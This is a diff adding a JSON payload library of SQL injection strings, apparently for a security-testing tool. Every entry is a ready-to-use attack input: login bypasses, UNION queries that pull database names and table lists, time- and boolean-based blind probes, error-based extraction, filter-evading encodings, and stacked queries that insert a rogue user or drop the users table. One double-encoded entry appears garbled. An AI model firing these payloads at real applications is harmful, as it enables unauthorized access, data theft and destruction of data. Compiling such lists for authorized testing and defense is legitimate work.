@@ -1,0 +1,459 @@
+{
+    "category": "SQLi",
+    "description": "SQL Injection payloads for various database types and bypass techniques",
+    "payloads": [
+        {
+            "id": "sqli-basic-001",
+            "title": "Basic OR True",
+            "payload": "' OR '1'='1",
+            "category": "SQLi",
+            "subcategory": "Authentication Bypass",
+            "context": [
+                "login",
+                "input"
+            ],
+            "level": "low",
+            "tags": [
+                "basic",
+                "auth",
+                "bypass"
+            ],
+            "notes": "Classic auth bypass payload",
+            "source": "github"
+        },
+        {
+            "id": "sqli-basic-002",
+            "title": "OR True with Comment",
+            "payload": "' OR '1'='1'--",
+            "category": "SQLi",
+            "subcategory": "Authentication Bypass",
+            "context": [
+                "login",
+                "input"
+            ],
+            "level": "low",
+            "tags": [
+                "basic",
+                "auth",
+                "comment"
+            ],
+            "notes": "Auth bypass with SQL comment",
+            "source": "github"
+        },
+        {
+            "id": "sqli-basic-003",
+            "title": "OR True Double Dash",
+            "payload": "' OR 1=1--",
+            "category": "SQLi",
+            "subcategory": "Authentication Bypass",
+            "context": [
+                "login",
+                "input"
+            ],
+            "level": "low",
+            "tags": [
+                "basic",
+                "auth",
+                "numeric"
+            ],
+            "notes": "Numeric comparison bypass",
+            "source": "github"
+        },
+        {
+            "id": "sqli-basic-004",
+            "title": "Admin Comment Bypass",
+            "payload": "admin'--",
+            "category": "SQLi",
+            "subcategory": "Authentication Bypass",
+            "context": [
+                "login",
+                "username"
+            ],
+            "level": "low",
+            "tags": [
+                "admin",
+                "auth",
+                "comment"
+            ],
+            "notes": "Login as admin with comment",
+            "source": "github"
+        },
+        {
+            "id": "sqli-union-001",
+            "title": "UNION Select NULL",
+            "payload": "' UNION SELECT NULL--",
+            "category": "SQLi",
+            "subcategory": "UNION-based",
+            "context": [
+                "search",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "union",
+                "select",
+                "null"
+            ],
+            "notes": "Column count detection",
+            "source": "github"
+        },
+        {
+            "id": "sqli-union-002",
+            "title": "UNION Select 2 Columns",
+            "payload": "' UNION SELECT NULL,NULL--",
+            "category": "SQLi",
+            "subcategory": "UNION-based",
+            "context": [
+                "search",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "union",
+                "columns",
+                "null"
+            ],
+            "notes": "2 column UNION",
+            "source": "github"
+        },
+        {
+            "id": "sqli-union-003",
+            "title": "UNION Select 3 Columns",
+            "payload": "' UNION SELECT NULL,NULL,NULL--",
+            "category": "SQLi",
+            "subcategory": "UNION-based",
+            "context": [
+                "search",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "union",
+                "columns",
+                "null"
+            ],
+            "notes": "3 column UNION",
+            "source": "github"
+        },
+        {
+            "id": "sqli-union-004",
+            "title": "UNION Extract Version MySQL",
+            "payload": "' UNION SELECT @@version,NULL,NULL--",
+            "category": "SQLi",
+            "subcategory": "UNION-based",
+            "context": [
+                "search",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "union",
+                "mysql",
+                "version"
+            ],
+            "notes": "Extract MySQL version",
+            "source": "github"
+        },
+        {
+            "id": "sqli-union-005",
+            "title": "UNION Extract Database",
+            "payload": "' UNION SELECT database(),NULL,NULL--",
+            "category": "SQLi",
+            "subcategory": "UNION-based",
+            "context": [
+                "search",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "union",
+                "mysql",
+                "database"
+            ],
+            "notes": "Get current database name",
+            "source": "github"
+        },
+        {
+            "id": "sqli-union-006",
+            "title": "UNION Extract Tables",
+            "payload": "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
+            "category": "SQLi",
+            "subcategory": "UNION-based",
+            "context": [
+                "search",
+                "input"
+            ],
+            "level": "high",
+            "tags": [
+                "union",
+                "mysql",
+                "tables"
+            ],
+            "notes": "List all tables in current database",
+            "source": "github"
+        },
+        {
+            "id": "sqli-blind-001",
+            "title": "Boolean Blind True",
+            "payload": "' AND 1=1--",
+            "category": "SQLi",
+            "subcategory": "Blind",
+            "context": [
+                "search",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "blind",
+                "boolean",
+                "true"
+            ],
+            "notes": "Boolean-based blind - true condition",
+            "source": "github"
+        },
+        {
+            "id": "sqli-blind-002",
+            "title": "Boolean Blind False",
+            "payload": "' AND 1=2--",
+            "category": "SQLi",
+            "subcategory": "Blind",
+            "context": [
+                "search",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "blind",
+                "boolean",
+                "false"
+            ],
+            "notes": "Boolean-based blind - false condition",
+            "source": "github"
+        },
+        {
+            "id": "sqli-blind-003",
+            "title": "Time-based Blind MySQL",
+            "payload": "' AND SLEEP(5)--",
+            "category": "SQLi",
+            "subcategory": "Blind",
+            "context": [
+                "search",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "blind",
+                "time",
+                "mysql"
+            ],
+            "notes": "Time-based blind with 5s delay",
+            "source": "github"
+        },
+        {
+            "id": "sqli-blind-004",
+            "title": "Time-based Blind MSSQL",
+            "payload": "'; WAITFOR DELAY '0:0:5'--",
+            "category": "SQLi",
+            "subcategory": "Blind",
+            "context": [
+                "search",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "blind",
+                "time",
+                "mssql"
+            ],
+            "notes": "Time-based blind for MSSQL",
+            "source": "github"
+        },
+        {
+            "id": "sqli-blind-005",
+            "title": "Time-based Blind PostgreSQL",
+            "payload": "'; SELECT pg_sleep(5)--",
+            "category": "SQLi",
+            "subcategory": "Blind",
+            "context": [
+                "search",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "blind",
+                "time",
+                "postgresql"
+            ],
+            "notes": "Time-based blind for PostgreSQL",
+            "source": "github"
+        },
+        {
+            "id": "sqli-error-001",
+            "title": "Error-based ExtractValue",
+            "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
+            "category": "SQLi",
+            "subcategory": "Error-based",
+            "context": [
+                "search",
+                "input"
+            ],
+            "level": "high",
+            "tags": [
+                "error",
+                "mysql",
+                "extractvalue"
+            ],
+            "notes": "MySQL error-based extraction",
+            "source": "github"
+        },
+        {
+            "id": "sqli-error-002",
+            "title": "Error-based UpdateXML",
+            "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--",
+            "category": "SQLi",
+            "subcategory": "Error-based",
+            "context": [
+                "search",
+                "input"
+            ],
+            "level": "high",
+            "tags": [
+                "error",
+                "mysql",
+                "updatexml"
+            ],
+            "notes": "MySQL UpdateXML error extraction",
+            "source": "github"
+        },
+        {
+            "id": "sqli-stacked-001",
+            "title": "Stacked Query Insert",
+            "payload": "'; INSERT INTO users(username,password) VALUES('hacker','hacked')--",
+            "category": "SQLi",
+            "subcategory": "Stacked Queries",
+            "context": [
+                "input"
+            ],
+            "level": "high",
+            "tags": [
+                "stacked",
+                "insert",
+                "write"
+            ],
+            "notes": "Insert new user via stacked query",
+            "source": "github"
+        },
+        {
+            "id": "sqli-stacked-002",
+            "title": "Stacked Query Drop Table",
+            "payload": "'; DROP TABLE users--",
+            "category": "SQLi",
+            "subcategory": "Stacked Queries",
+            "context": [
+                "input"
+            ],
+            "level": "high",
+            "tags": [
+                "stacked",
+                "drop",
+                "destructive"
+            ],
+            "notes": "DANGEROUS - drops table (for authorized testing only)",
+            "source": "github"
+        },
+        {
+            "id": "sqli-bypass-001",
+            "title": "Case Variation",
+            "payload": "' uNiOn SeLeCt NULL--",
+            "category": "SQLi",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "search",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "case",
+                "filter"
+            ],
+            "notes": "Case variation to bypass filters",
+            "source": "github"
+        },
+        {
+            "id": "sqli-bypass-002",
+            "title": "Comment Inline",
+            "payload": "' UN/**/ION SEL/**/ECT NULL--",
+            "category": "SQLi",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "search",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "comment",
+                "inline"
+            ],
+            "notes": "Inline comment bypass",
+            "source": "github"
+        },
+        {
+            "id": "sqli-bypass-003",
+            "title": "URL Encoding",
+            "payload": "%27%20OR%20%271%27%3D%271",
+            "category": "SQLi",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url",
+                "input"
+            ],
+            "level": "medium",
+            "tags": [
+                "bypass",
+                "encoding",
+                "url"
+            ],
+            "notes": "URL encoded OR payload",
+            "source": "github"
+        },
+        {
+            "id": "sqli-bypass-004",
+            "title": "Hex Encoding",
+            "payload": "' UNION SELECT 0x61646d696e--",
+            "category": "SQLi",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "search",
+                "input"
+            ],
+            "level": "high",
+            "tags": [
+                "bypass",
+                "hex",
+                "encoding"
+            ],
+            "notes": "Hex encoded 'admin' string",
+            "source": "github"
+        },
+        {
+            "id": "sqli-bypass-005",
+            "title": "Double URL Encoding",
+            "payload": "%252727%2520OR%2520%25271%2527%253D%25271",
+            "category": "SQLi",
+            "subcategory": "Filter Bypass",
+            "context": [
+                "url"
+            ],
+            "level": "high",
+            "tags": [
+                "bypass",
+                "double",
+                "encoding"
+            ],
+            "notes": "Double URL encoding bypass",
+            "source": "github"
+        }
+    ]
+}
